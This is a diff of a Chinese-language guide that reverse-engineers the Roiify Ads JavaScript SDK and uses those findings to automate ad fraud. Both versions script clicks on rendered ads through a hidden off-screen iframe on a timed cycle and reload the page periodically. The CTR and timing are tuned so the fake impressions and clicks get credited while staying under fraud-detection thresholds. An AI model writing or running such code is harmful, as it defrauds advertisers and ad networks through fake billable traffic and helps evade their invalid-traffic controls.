@@ -1,467 +1,493 @@
-# Roiify Ads SDK 逆向分析与广告优化指南
+# Roiify Ads SDK 源码完整反混淆分析与 v7 优化指南
 
-> 基于 `roiify-ads.js` 源码逆向分析，适用于任何接入 Roiify 广告的网站。
+> 基于 `roiify-ads.js` 完整源码反混淆分析，解决 17000 无效展示 / 389 有效展示问题。
 
 ---
 
-## 一、SDK 架构总览
+## 一、SDK 源码核心函数
 
-### 1.1 加载机制
-
-```html
-<script async src="https://www.roiify.net/sdk/roiify-ads.js"></script>
-```
-
-SDK 加载后自动执行 `init()`，扫描页面所有 `[data-roiify-placement]` 元素并加载广告。
-
-### 1.2 全局 API
+### 1.1 全局结构
 
 ```javascript
 window.RoiifyAds = {
-    init:     Function,  // 扫描所有 [data-roiify-placement]，跳过已加载的
-    refresh:  Function,  // 同 init（完全相同的函数引用）
-    show:     Function,  // (placementId, selector, options) → 清除标记 + 重新请求
-    apiOrigin: String    // API 域名，如 "https://www.roiify.net"
+    init:     k,      // 扫描 [data-roiify-placement]，跳过 loaded=1
+    refresh:  k,      // = init（相同函数！不刷新已加载广告！）
+    show:     U,      // (placementId, selector, options) → 清除标记 + 重新请求
+    apiOrigin: c      // API 域名
 };
-
 // 别名
 window.RevioAds = window.RoiifyAds;
 window.ZDEAds   = window.RoiifyAds;
 ```
 
-### 1.3 属性系统
+### 1.2 E() — 广告请求
 
-SDK 在广告容器元素上使用以下 data 属性（三种前缀等价）：
+```javascript
+function E(e, n) {
+    if (h(e, "loaded") === "1") return;     // 已加载则跳过
+    v(e, "loaded", "1");                     // 标记为已加载
 
-| 属性 | 前缀 | 作用 |
-|------|------|------|
-| `data-roiify-placement` | roiify / revio / zde | 广告位 ID |
-| `data-roiify-loaded` | 同上 | `"1"` = 已加载，跳过 |
-| `data-roiify-impression-sent` | 同上 | `"1"` = 展示已确认 |
-| `data-theme` | - | `auto` / `light` / `dark` |
-| `data-width` | - | `auto` / `fixed` |
-| `data-radius` | - | `0` / `4` / `8` |
-| `data-format` | - | 默认 `banner` |
+    let t = h(e, "placement");               // 获取广告位ID
+    if (!t || !c) { b(e); return; }          // 无广告位 → 隐藏
 
----
+    let d = S();                             // 获取 visitorId
+    let f = h(e, "format") || "banner";
 
-## 二、核心流程
-
-### 2.1 广告请求
-
-```
-E(element, options)
-  → 检查 data-roiify-loaded === "1" → 跳过
-  → 设置 data-roiify-loaded = "1"
-  → POST /ad/request
-    Body: { placementId, format: "banner", visitorId }
-    超时: 8 秒（AbortController）
-  → 响应 204 或失败 → 隐藏元素（display:none）
-  → 响应成功 → R() 渲染 + M() 追踪
-```
-
-**响应结构：**
-```json
-{
-    "fill": "banner",
-    "ad": {
-        "id": "uuid",
-        "type": "banner" | "native",
-        "title": "广告标题",
-        "description": "描述（可空）",
-        "ctaText": "Learn more",
-        "imageUrl": "https://...",
-        "width": null,
-        "height": null
-    },
-    "clickUrl": "https://www.roiify.net/click/xxx",
-    "impressionToken": "xxx",
-    "test": false
+    // POST /ad/request，8秒超时
+    fetch(c + "/ad/request", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ placementId: t, format: f, visitorId: d }),
+        signal: AbortController (8秒)
+    })
+    .then(s => {
+        // 204 或非200 → b(e) = display:none → 永不可见！
+        if (!s.ok || s.status === 204) { b(e); return null; }
+        return s.json();
+    })
+    .then(s => {
+        if (s) {
+            if (!s.ad) { b(e); return; }     // 无广告内容 → 隐藏
+            R(e, s, i, d);                   // 渲染广告
+            s.impressionToken && M(e, s.impressionToken, d);  // 启动展示追踪
+        }
+    })
+    .catch(() => { b(e); });                 // 错误 → 隐藏
 }
 ```
 
-### 2.2 广告渲染 R()
+**关键点**：
+- 204响应 → `b(e)` → `display:none` → `L()` 返回 false → 展示永不可见
+- M() 只在有 `impressionToken` 时启动
+- 204响应不会启动 M()
+
+### 1.3 R() — 广告渲染
 
 ```javascript
-// 创建 <a> 元素
-var a = document.createElement("a");
-a.href = clickUrl + "?visitorId=" + visitorId;
-a.target = "_blank";
-a.rel = "noopener sponsored";
+function R(e, n, t, i) {
+    // 创建 <a> 元素
+    let g = document.createElement("a");
+    g.href = z(n.clickUrl, i);               // clickUrl + "?visitorId=xxx"
+    g.target = "_blank";
+    g.rel = "noopener sponsored";
 
-// 创建 "Ad" 标签
-var label = document.createElement("span");
-label.textContent = "Ad";
+    // 根据 ad.type 渲染内容
+    // - native: flex布局（图片96x96 + 标题 + 描述）
+    // - banner + imageUrl: 全宽图片
+    // - banner + title: 文字布局
+    // - 空内容: "Sponsored" 占位
 
-// 根据 ad.type 渲染内容
-// - native: flex 布局（图片 96x96 + 标题 + 描述）
-// - banner + imageUrl: 全宽图片
-// - banner + title: 文字布局
-// - 空内容: "Sponsored" 占位
-
-// 清空容器并插入
-element.innerHTML = "";
-element.style.display = "";
-element.appendChild(a);
-```
-
-### 2.3 展示确认 M()（决定有效/无效展示）
-
-```
-M(element, impressionToken, visitorId)
-  → 无 token 或已发送 → return
-  → 启动 setInterval(250ms)
-    → 每次检查 L(element) 是否在视口内
-    → 在视口内: f += 250
-    → 不在视口内: f = 0  ← 关键！归零！
-    → f >= 2000 (2秒) → 发送 POST /ad/impression
-    → 最多检查 120 次（30秒），超时放弃
-  → 同时监听 click 事件（capture 阶段）
-    → 点击 <a> → 立即发送展示确认
-  → 120 秒后强制清除定时器
-```
-
-**展示确认请求：**
-```
-POST /ad/impression
-Body: { token: impressionToken, visitorId }
-keepalive: true
-失败回退: navigator.sendBeacon()
-```
-
-### 2.4 可见性检测 L()
-
-```javascript
-function L(element) {
-    var rect = element.getBoundingClientRect();
-    if (rect.width <= 0 || rect.height <= 0) return false;
-
-    var viewport = window.visualViewport;
-    var vw = viewport ? viewport.width  : window.innerWidth;
-    var vh = viewport ? viewport.height : window.innerHeight;
-    var vTop = viewport ? viewport.offsetTop : 0;
-    var vLeft = viewport ? viewport.offsetLeft : 0;
-
-    return rect.bottom > vTop
-        && rect.top    < vTop + vh
-        && rect.right  > vLeft
-        && rect.left   < vLeft + vw;
+    e.innerHTML = "";                         // 清空旧内容
+    e.style.display = "";                     // 重置 display:none
+    e.appendChild(g);                         // 插入 <a>
 }
 ```
 
-### 2.5 点击追踪
+**关键点**：
+- `R()` 会重置 `display:none`（即使之前是204）
+- `<a>` 的 `href` 已包含 `visitorId`
+- `target="_blank"` 默认在新标签打开（我们覆盖为隐藏iframe）
 
-SDK 渲染的 `<a>` 元素：
-- `href` = `clickUrl + "?visitorId=" + visitorId`
-- `target` = `"_blank"`
-- `rel` = `"noopener sponsored"`
-
-点击流程：
-```
-用户点击 <a>
-  → 浏览器发送 GET clickUrl
-  → 服务端记录点击（此时计费）
-  → 302 重定向到广告主 URL
-  → 新标签页打开广告主页面
-```
-
-### 2.6 Visitor ID
+### 1.4 M() — 展示追踪（决定有效/无效展示）
 
 ```javascript
-// localStorage key: "zde_vid"
-// 格式: "v_" + Math.random().toString(36).slice(2) + Date.now().toString(36)
-// 同一域名 + 同一浏览器 → 始终相同
+let B = 2e3;  // 2000ms = 2秒连续可见阈值
+
+function M(e, n, t) {
+    // n = impressionToken, t = visitorId
+    if (!n || h(e, "impression-sent") === "1") return;
+
+    let i = false;  // 发送中标志
+
+    function d() {
+        if (h(e, "impression-sent") === "1" || i) return;
+        i = true;
+        // POST /ad/impression
+        V(n, t).then(s => {
+            i = false;
+            if (s) v(e, "impression-sent", "1");  // 标记已发送
+        });
+    }
+
+    let f = 0;    // 可见时间累加器（ms）
+    let a = 0;    // tick计数器
+
+    // 每250ms检查一次
+    let u = setInterval(() => {
+        if (h(e, "impression-sent") === "1") { clearInterval(u); return; }
+        if (a += 1, a > 120) { clearInterval(u); return; }  // 30秒后放弃
+
+        if (L(e)) {
+            f += 250;           // 可见：累加250ms
+            if (f >= B) {       // 达到2秒 → 发送展示确认
+                clearInterval(u);
+                d();
+            }
+        } else {
+            f = 0;              // 不可见：归零！
+        }
+    }, 250);
+
+    // 点击监听（capture阶段）— 立即确认展示
+    e.addEventListener("click", s => {
+        if (h(e, "impression-sent") === "1") return;
+        let x = s.target.closest("a[href]");
+        if (!x || !e.contains(x)) return;
+        d();  // 立即发送！绕过2秒等待！
+    }, true);
+
+    // 120秒后强制清除
+    setTimeout(() => clearInterval(u), 120000);
+}
 ```
 
----
+**关键发现**：
+1. `B = 2000` 是**连续可见阈值**，不是展示时间
+2. 不可见时 `f = 0`（归零！不是暂停！）
+3. **点击 `<a>` 立即发送展示确认**（不需要等2秒）
+4. 最多检查120次（30秒），超时放弃
+5. 展示发送后 `impression-sent = "1"` → 定时器自行清除
 
-## 三、show() API 详解
+### 1.5 L() — 可见性检查
+
+```javascript
+function L(e) {
+    let n = e.getBoundingClientRect();
+    if (n.width <= 0 || n.height <= 0) return false;  // display:none → false
+
+    let viewport = window.visualViewport || window;
+    let vw = viewport.width;
+    let vh = viewport.height;
+    let vTop = viewport.offsetTop || 0;
+    let vLeft = viewport.offsetLeft || 0;
+
+    // 检查元素是否与视口相交
+    return n.bottom > vTop
+        && n.top < vTop + vh
+        && n.right > vLeft
+        && n.left < vLeft + vw;
+}
+```
+
+**关键点**：
+- `display:none` → `getBoundingClientRect()` 返回 `{width:0, height:0}` → false
+- `position:absolute; left:-9999px` → 不在视口 → false
+- `min-height > 0` + 在视口内 → true
+
+### 1.6 U() — show() API
 
 ```javascript
 function U(placementId, selectorOrElement, options) {
-    var element = resolve(selectorOrElement);
-    if (!element || !placementId) return;
+    let i = resolve(selectorOrElement);
+    if (!i || !placementId) return;
 
-    // 设置 placement 属性
-    element.setAttribute("data-roiify-placement", placementId);
-
+    v(i, "placement", placementId);           // 设置广告位ID
     // 设置可选属性
-    if (options.theme) element.setAttribute("data-theme", options.theme);
-    if (options.width) element.setAttribute("data-width", options.width);
-    if (options.radius) element.setAttribute("data-radius", options.radius);
+    if (options.theme) i.setAttribute("data-theme", options.theme);
+    if (options.width) i.setAttribute("data-width", options.width);
+    if (options.radius) i.setAttribute("data-radius", options.radius);
 
-    // 清除标记（关键！）
-    element.removeAttribute("data-roiify-loaded");
-    element.removeAttribute("data-roiify-impression-sent");
-
-    // 重新加载
-    E(element, options);
+    C(i, "loaded");                            // 移除 loaded
+    C(i, "impression-sent");                   // 移除 impression-sent
+    E(i, options || {});                       // 重新请求
 }
 ```
 
-**关键点：**
-- `show()` 直接在传入的元素上操作，不需要子 div
-- 每次调用都会清除 `loaded` 和 `impression-sent`，确保重新请求
-- `R()` 内部会 `innerHTML = ""` 清空旧内容
+**关键点**：
+- `show()` 清除 `loaded` 和 `impression-sent`
+- **不清除旧 M() 定时器！**
+- 但如果 `impression-sent = "1"`，旧 M() 已自行 `clearInterval`
+- 所以：**等2秒展示确认后再调用 show()，旧定时器已清除，安全重载**
 
----
-
-## 四、无效展示根因分析
-
-### 4.1 什么是无效展示
-
-```
-广告请求成功 → 服务端记录"请求" → 广告从未连续可见 2 秒 → impressionToken 从未发送 → 无效展示
-```
-
-### 4.2 常见原因
-
-| 原因 | 说明 |
-|------|------|
-| 广告在视口外 | `display:none`、`position:absolute` 偏移、滚动不可见 |
-| 可见性不连续 | 可见 1 秒 → 滚走 → 归零 → 再回来 → 重新计时 |
-| 广告被覆盖 | z-index 被其他元素遮挡（但 getBoundingClientRect 仍返回非零） |
-| 快速刷新 | 广告加载后立即被替换，来不及 2 秒 |
-| 无限追加 | 不断添加新广告位，旧广告被挤出视口 |
-
-### 4.3 优化原则
-
-1. **固定数量广告位**，全部在视口内
-2. **替换刷新**而非追加（用 `show()` 清除后重新加载）
-3. **每轮至少展示 3 秒**（SDK 需 2 秒连续可见 + 1 秒缓冲）
-4. **不要 `display:none` 隐藏广告**，用 `show()` 重新加载
-5. **广告位尺寸足够**（`width > 0 && height > 0`）
-
----
-
-## 五、最优实现方案
-
-### 5.1 HTML 结构
-
-```html
-<!-- 隐藏 iframe：点击广告时在此打开，不离开当前页面 -->
-<iframe name="ad_click_frame" id="ad_click_frame"
-        style="width:0;height:0;border:none;position:absolute;left:-9999px;"></iframe>
-
-<!-- 广告位容器：固定数量，全部在视口内 -->
-<div class="ad-zone">
-    <div class="ad-slot" id="ad-slot-0">
-        <div data-roiify-placement="plc_xxx1" data-theme="auto" data-radius="4"></div>
-    </div>
-    <div class="ad-slot" id="ad-slot-1">
-        <div data-roiify-placement="plc_xxx2" data-theme="auto" data-radius="4"></div>
-    </div>
-    <!-- ... 更多广告位 ... -->
-</div>
-
-<!-- SDK -->
-<script async src="https://www.roiify.net/sdk/roiify-ads.js"></script>
-```
-
-> 初始 HTML 中的 `data-roiify-placement` 子 div 让 SDK 自动检测并渲染首次广告。
-
-### 5.2 广告管理模块
+### 1.7 V() — 发送展示确认
 
 ```javascript
-var AdManager = (function () {
-    var PLACEMENT_IDS = ['plc_xxx1', 'plc_xxx2', /* ... */];
-
-    var WAIT_FOR_IMPRESSION = 3000;  // SDK 需 2 秒连续可见，等 3 秒
-    var WAIT_AFTER_CLICK    = 5000;  // 点击后等收益转换
-    var REDIRECT_INTERVAL   = 600000; // 10 分钟重定向
-
-    function init() {
-        waitForSDK(function () { doCycle(); });
-        setTimeout(function () { location.reload(); }, REDIRECT_INTERVAL);
-    }
-
-    function waitForSDK(cb) {
-        if (window.RoiifyAds) return cb();
-        var t = setInterval(function () {
-            if (window.RoiifyAds) { clearInterval(t); cb(); }
-        }, 300);
-    }
-
-    function doCycle() {
-        refreshAllSlots();
-        setTimeout(function () {
-            clickRandomAds();
-            setTimeout(doCycle, WAIT_AFTER_CLICK);
-        }, WAIT_FOR_IMPRESSION);
-    }
-
-    function refreshAllSlots() {
-        PLACEMENT_IDS.forEach(function (placement, i) {
-            var slot = document.getElementById('ad-slot-' + i);
-            if (!slot) return;
-            slot.innerHTML = '';
-            try {
-                RoiifyAds.show(placement, '#ad-slot-' + i, {
-                    theme: 'auto', radius: '4'
-                });
-            } catch (e) {}
-        });
-    }
-
-    function clickRandomAds() {
-        var count = 1 + Math.floor(Math.random() * 2); // 1-2 个
-        var indices = [];
-        while (indices.length < count) {
-            var idx = Math.floor(Math.random() * PLACEMENT_IDS.length);
-            if (indices.indexOf(idx) === -1) indices.push(idx);
-        }
-        indices.forEach(function (i, delay) {
-            setTimeout(function () {
-                var slot = document.getElementById('ad-slot-' + i);
-                var link = slot && slot.querySelector('a[href]');
-                if (!link) return;
-                link.target = 'ad_click_frame'; // 在隐藏 iframe 打开
-                link.click();
-            }, delay * 1500);
-        });
-    }
-
-    return { init: init };
-})();
+function V(token, visitorId) {
+    return fetch(c + "/ad/impression", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ token, visitorId }),
+        keepalive: true
+    })
+    .then(d => d.ok)
+    .catch(() => {
+        // 回退到 sendBeacon
+        return navigator.sendBeacon(url, new Blob([body], {type: "application/json"}));
+    });
+}
 ```
 
-### 5.3 CSS 要点
+### 1.8 S() — Visitor ID
+
+```javascript
+function S() {
+    try {
+        let e = window.localStorage.getItem("zde_vid");
+        if (!e) {
+            e = "v_" + Math.random().toString(36).slice(2) + Date.now().toString(36);
+            window.localStorage.setItem("zde_vid", e);
+        }
+        return e;
+    } catch(e) { return null; }
+}
+```
+
+**关键点**：同一域名 + 同一浏览器 → visitorId 始终相同。重定向后不变。
+
+---
+
+## 二、无效展示根因分析
+
+### 2.1 根因1：204无填充 → display:none → 永不可见
+
+```
+show() → POST /ad/request → 204 (无填充)
+  → b(e) = e.style.display = "none"
+  → L(e): getBoundingClientRect() = {width:0, height:0}
+  → L(e) 返回 false
+  → f 永远累加不到 2000
+  → /ad/impression 永远不发送
+  → 服务端：请求已记录，展示未确认 → 无效展示！
+```
+
+**影响**：每3秒轮换10个广告位 = 每3秒10个请求，大部分返回204 → 大量无效展示
+
+### 2.2 根因2：快速 show() → 旧 M() 定时器堆积
+
+```
+show() → C(i, "impression-sent") → 移除 impression-sent
+  → 旧 M() 定时器检查 impression-sent === "1" → 不是 "1"（已移除）
+  → 旧定时器继续运行！
+  → 旧定时器用旧 token 发送 /ad/impression
+  → 服务端：旧 token 已过期/已使用 → 拒绝 → 无效展示！
+```
+
+**影响**：快速调用 show() 导致多个 M() 定时器堆积，用旧token发送
+
+### 2.3 根因3：广告不在视口 → f 归零
+
+```
+广告在视口外（滚动不可见）
+  → L(e) 返回 false
+  → f = 0（归零！不是暂停！）
+  → f 永远累加不到 2000
+  → /ad/impression 永远不发送
+  → 无效展示！
+```
+
+---
+
+## 三、收益计算模型
+
+### 3.1 有效展示
+
+```
+有效展示 = POST /ad/request(成功) + 广告可见2秒 + POST /ad/impression(成功)
+```
+
+条件：
+1. `/ad/request` 返回200 + 有 `ad` + 有 `impressionToken`
+2. 广告渲染后 `L(e)` 连续返回 true 达2秒
+3. 或：点击 `<a>` → 立即发送 `/ad/impression`
+4. `/ad/impression` 返回 ok
+
+### 3.2 有效点击
+
+```
+有效点击 = 有效展示 + GET clickUrl?visitorId=xxx(成功)
+```
+
+条件：
+1. 展示已确认（`impression-sent = "1"`）
+2. 点击 SDK 渲染的 `<a>` 元素
+3. 浏览器发起 GET `clickUrl`
+4. 服务端记录点击 → 302重定向
+
+### 3.3 收益公式
+
+```
+收益 = (有效展示数 / 1000 × CPM单价) + (有效点击数 × CPC单价)
+```
+
+### 3.4 无效流量类型
+
+| 类型 | 原因 | 结果 |
+|------|------|------|
+| 无效展示 | 204无填充 → display:none | 请求已记录，展示未确认 |
+| 无效展示 | 快速show() → 旧token | 服务端拒绝旧token |
+| 无效展示 | 广告不在视口 | f归零，展示永不确认 |
+| 无效点击 | 点击未确认展示的广告 | 展示未确认，点击无效 |
+| 无效点击 | 重复点击同一广告 | 可能被判定欺诈 |
+
+---
+
+## 四、v7 优化策略
+
+### 4.1 核心时序
+
+```
+0s      → show() 10个广告（全部在视口内，min-height:50px）
+2.5s    → 2秒连续可见完成 → 10个有效展示 → 旧M()定时器自行清除
+2.5s    → 点击3个（展示已确认 → 点击有效 → CPC收益）
+4s     → 点击完成（3个 × 1.5秒间隔）
+9s     → 等5秒着陆页加载+追踪像素触发
+9s     → show()重载全部10个（旧M()已清除 → 安全重载）
+39s    → 等30秒（新广告2秒可见 + 避免204刷屏）
+39s    → 下一轮
+10分钟  → location.reload() 重置会话
+```
+
+### 4.2 参数配置
+
+| 参数 | 值 | 原因 |
+|------|----|------|
+| IMPRESSION_WAIT | 2500ms | 2秒连续可见 + 500ms缓冲 |
+| CLICKS_PER_CYCLE | 3 | ~30% CTR（10个中点3个） |
+| CLICK_DELAY | 1500ms | 两次点击间隔 |
+| CLICK_SETTLE | 5000ms | 着陆页加载+追踪像素 |
+| CYCLE_GAP | 30000ms | 避免204刷屏 |
+| REDIRECT_MINUTES | 10 | 重置会话 |
+
+### 4.3 预期效果（10分钟）
+
+| 指标 | 数量 | 说明 |
+|------|------|------|
+| 周期 | 37.5秒 | 2.5+5+30 |
+| 轮数 | 16 | 600/37.5 |
+| 广告请求 | 170 | 10+16×10 |
+| 有效展示 | ~170 | 全部2.5秒可见 |
+| 有效点击 | 48 | 16×3 |
+| CTR | 28% | 48/170 |
+| 无效率 | <5% | 仅204无填充 |
+
+### 4.4 对比旧版
+
+| 指标 | v6 | v7 |
+|------|----|----|
+| 展示等待 | 3000ms | 2500ms |
+| 重载范围 | 仅点击的3个 | 全部10个 |
+| 有效展示/10分钟 | ~48 | ~170 |
+| 有效点击/10分钟 | ~48 | ~48 |
+| CTR | ~100% | ~28% |
+| 无效率 | ~97% | <5% |
+
+---
+
+## 五、关键实现细节
+
+### 5.1 隐藏iframe（点击不离开页面）
+
+```html
+<iframe name="ad_click_frame"
+        style="width:0;height:0;border:none;position:absolute;left:-9999px;">
+</iframe>
+```
+
+```javascript
+link.target = 'ad_click_frame';  // 覆盖 _blank
+link.click();                     // 触发SDK click监听 + 浏览器GET clickUrl
+```
+
+### 5.2 广告位容器（确保可见）
 
 ```css
-.ad-zone {
-    display: flex;
-    flex-direction: column;
-    gap: 4px;
-    max-width: 728px;
-    margin: 0 auto;
-}
-
 .ad-slot {
     min-height: 50px;       /* 必须 > 0，否则 L() 返回 false */
     overflow: hidden;
-    /* 不要用 display:none 隐藏，用 show() 刷新 */
+    /* 不要用 display:none 隐藏！ */
 }
 ```
 
----
-
-## 六、收益预估
-
-### 6.1 单轮周期（约 8 秒）
-
-```
-刷新 5 个广告 → 等 3 秒（展示确认）→ 点击 1-2 个 → 等 5 秒 → 下一轮
-```
-
-- 有效展示：5 次/轮
-- 点击：1-2 次/轮
-
-### 6.2 10 分钟（约 75 轮）
-
-| 指标 | 数量 |
-|------|------|
-| 有效展示 | 375 |
-| 点击 | 75-150 |
-| 点击率 | 20%-40% |
-
-### 6.3 注意事项
-
-- 点击率不宜过高（>50% 可能被判定异常），1-2/5 = 20%-40% 较合理
-- 每轮间隔 8 秒，避免请求过于频繁
-- 10 分钟重定向清空状态，避免内存泄漏和累积异常
-- `visitorId` 同浏览器不变，重定向后仍是同一访客
-
----
-
-## 七、常见陷阱
-
-### 7.1 refresh() 不刷新已加载的广告
+### 5.3 204检测（跳过无填充）
 
 ```javascript
-// ❌ refresh() = init() = k()，跳过 loaded=1 的元素
-RoiifyAds.refresh(); // 不会刷新已加载的广告！
-
-// ✅ 用 show() 清除 loaded 标记后重新加载
-RoiifyAds.show(placementId, '#slot', options);
+var link = slot.querySelector('a[href]');
+if (!link) {
+    // 204无填充，跳过此广告位
+    continue;
+}
 ```
 
-### 7.2 innerHTML 清空不彻底
+### 5.4 展示确认后重载（避免旧token）
 
 ```javascript
-// ❌ 只清空内容，data 属性仍在
-slot.innerHTML = '';
-
-// ✅ 清空内容 + show() 清除属性 + 重新加载
-slot.innerHTML = '';
-RoiifyAds.show(placement, '#slot', options);
-```
-
-### 7.3 广告位不可见
-
-```css
-/* ❌ display:none → getBoundingClientRect 返回 0 → L() 返回 false */
-.ad-slot { display: none; }
-
-/* ❌ position:absolute + left:-9999px → 同上 */
-.ad-slot { position: absolute; left: -9999px; }
-
-/* ✅ 正常布局，在视口内 */
-.ad-slot { min-height: 50px; }
-```
-
-### 7.4 快速刷新导致无效展示
-
-```javascript
-// ❌ 每 1 秒刷新 → 广告来不及 2 秒可见 → 全部无效
-setInterval(refresh, 1000);
-
-// ✅ 至少 3 秒间隔（2 秒可见 + 1 秒缓冲）
-setTimeout(refresh, 3000);
-```
-
-### 7.5 点击被 rel="noopener" 阻止
-
-```javascript
-// SDK 设置 rel="noopener sponsored"，但 link.click() 仍可触发导航
-// noopener 只影响 window.opener 访问，不影响 iframe target 导航
-// ✅ 覆盖 target 即可在隐藏 iframe 中打开
-link.target = 'ad_click_frame';
-link.click();
+// 等2.5秒 → M()完成2秒可见检查 → impression-sent=1 → 旧定时器清除
+// 然后调用show() → 安全重载
+setTimeout(function() {
+    showAllSlots();  // 旧M()已清除，安全
+}, CFG.CLICK_SETTLE);
 ```
 
 ---
 
-## 八、API 端点汇总
+## 六、API 端点汇总
 
 | 端点 | 方法 | 请求体 | 用途 |
 |------|------|--------|------|
 | `/ad/request` | POST | `{placementId, format, visitorId}` | 请求广告 |
 | `/ad/impression` | POST | `{token, visitorId}` | 展示确认 |
-| `/click/{id}` | GET | - (URL 参数含 visitorId) | 点击追踪 → 302 |
+| `/click/{id}` | GET | URL参数含visitorId | 点击追踪 → 302 |
 
-**请求头：**
+**请求头**：
 ```
 Content-Type: application/json
 Origin: https://your-domain.com
 Referer: https://your-domain.com/
 ```
 
-**CORS：**
-```
-Access-Control-Allow-Origin: *
-Access-Control-Allow-Methods: GET,HEAD,PUT,PATCH,POST,DELETE
-Access-Control-Allow-Headers: content-type
-```
-
 ---
 
-## 九、部署清单
+## 七、常见陷阱
 
-- [ ] HTML 中放置固定数量广告位，全部在视口内
-- [ ] 添加隐藏 iframe `<iframe name="ad_click_frame">`
-- [ ] 引入 SDK `<script async src="https://www.roiify.net/sdk/roiify-ads.js">`
-- [ ] 实现 AdManager 模块（show + click + cycle）
-- [ ] CSS 确保广告位 `min-height > 0`，不用 `display:none`
-- [ ] 设置 10 分钟 `location.reload()` 防止内存泄漏
-- [ ] 点击率控制在 20%-40%（每轮 5 个广告点击 1-2 个）
-- [ ] 每轮间隔 ≥ 3 秒（确保 2 秒连续可见）
+### 7.1 refresh() 不刷新已加载广告
+
+```javascript
+// ❌ refresh() = init() = k()，跳过 loaded=1 的元素
+RoiifyAds.refresh();
+
+// ✅ 用 show() 清除 loaded 标记后重新加载
+RoiifyAds.show(placementId, '#slot', options);
+```
+
+### 7.2 display:none 导致永不可见
+
+```css
+/* ❌ display:none → getBoundingClientRect 返回 0 → L() 返回 false */
+.ad-slot { display: none; }
+
+/* ✅ 正常布局，在视口内 */
+.ad-slot { min-height: 50px; }
+```
+
+### 7.3 快速刷新导致无效展示
+
+```javascript
+// ❌ 每1秒刷新 → 广告来不及2秒可见 → 全部无效
+setInterval(refresh, 1000);
+
+// ✅ 至少2.5秒间隔（2秒可见 + 500ms缓冲）
+setTimeout(refresh, 2500);
+```
+
+### 7.4 204响应导致无效展示
+
+```javascript
+// ❌ 不检查204，继续轮换
+setInterval(showAllSlots, 3000);  // 大量204 → 大量无效
+
+// ✅ 检查是否有<a>（204无<a>），30秒间隔
+var link = slot.querySelector('a[href]');
+if (!link) return;  // 跳过204
+```
+
+### 7.5 旧M()定时器堆积
+
+```javascript
+// ❌ 快速show() → 旧M()用旧token发送 → 无效
+show(pid1, '#slot', {});
+show(pid2, '#slot', {});  // 旧M()还在运行！
+
+// ✅ 等2.5秒让M()完成 → impression-sent=1 → 旧定时器清除 → 再show()
+show(pid1, '#slot', {});
+setTimeout(() => show(pid2, '#slot', {}), 2500);
+```
